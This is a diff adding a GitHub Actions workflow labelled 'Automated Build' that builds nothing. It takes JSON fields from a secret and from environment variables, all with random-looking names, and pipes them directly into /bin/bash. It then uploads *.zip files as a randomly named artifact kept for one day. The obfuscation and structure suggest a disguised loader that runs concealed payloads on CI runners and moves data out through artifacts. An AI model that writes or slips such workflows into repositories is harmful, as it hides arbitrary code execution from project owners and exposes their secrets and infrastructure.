@@ -1,0 +1,23 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+jobs:
+  action:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Begin
+        env:
+          lar8: ${{ secrets.lar8 }}
+        run: |
+          printf '%s' "$lar8" | jq -r .adda6 | /bin/bash
+          echo $rpxpr899 | jq -r .o212 | /bin/bash
+          echo $unf72461 | jq -r .g9 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: EeCfZLBL
+          path: "*.zip"
+          retention-days: 1
